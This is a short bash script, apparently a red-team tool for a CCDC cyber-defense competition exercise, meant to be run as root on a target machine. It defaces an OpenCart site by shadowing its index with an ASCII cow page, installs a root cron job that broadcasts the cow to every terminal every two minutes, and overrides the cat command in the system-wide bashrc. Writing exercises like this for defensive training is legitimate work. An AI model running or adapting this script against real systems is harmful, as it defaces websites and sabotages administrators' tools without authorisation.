#!/bin/bash
# CCDC Red Team - Level 3
# Run as root (QEMU guest agent runs as root by default).
# Comment out a function call at the bottom to skip that task.

# ---------- ASCII art ----------
read -r -d '' BIG_COW <<'EOF'
 _________________
< HACKED  -  MOO! >
 -----------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
EOF

# --- Part A: deface the OpenCart index so curl/wget localhost shows the cow ---
deface_index() {
    # Detect the OpenCart docroot from the enabled Apache vhost; fall back to default.
    local webroot
    webroot="$(grep -rhiE '^[[:space:]]*DocumentRoot' /etc/apache2/sites-enabled/ 2>/dev/null \
               | awk '{print $2}' | head -n1)"
    webroot="${webroot:-/var/www/html}"

    # index.html outranks index.php in DirectoryIndex, so this shadows OpenCart
    # without touching its files.
    printf '%s\n' "$BIG_COW" > "$webroot/index.html"
    chmod 644 "$webroot/index.html"
}

# --- Part B (distraction 1): cron that broadcasts a cow to all terminals every 2 min ---
install_cow_cron() {
    printf '%s\n' "$BIG_COW" > /usr/local/share/ccdc-cow.txt

    cat > /usr/local/bin/cowwall.sh <<'EOF'
#!/bin/bash
wall < /usr/local/share/ccdc-cow.txt
EOF
    chmod +x /usr/local/bin/cowwall.sh

    # Easy-to-find location, separate from the mail-stop cron.
    cat > /etc/cron.d/ccdc-cow <<'EOF'
*/2 * * * * root /usr/local/bin/cowwall.sh
EOF
    chmod 644 /etc/cron.d/ccdc-cow
}

# --- Distraction 2: replace `cat` with the small cow in interactive shells ---
break_cat() {
    # Appends a function to the system-wide bashrc. The function uses printf
    # (never cat) so it does not recurse, ignores its args, and always prints
    # the cow. Only interactive shells source bashrc, so nano and system
    # scripts still work. Escape routes for a sharp student: unset -f cat,
    # /bin/cat, command cat, or editing bashrc in nano.
    if ! grep -q 'ccdc-cat-override' /etc/bash.bashrc; then
        cat >> /etc/bash.bashrc <<'EOF'

# ccdc-cat-override
cat() {
    printf '%s\n' \
'        (__)' \
' `----- (oo)' \
'  ||    (__)' \
'  ||w---||'
}
EOF
    fi
}

# --- Tasks ---
deface_index
install_cow_cron
break_cat
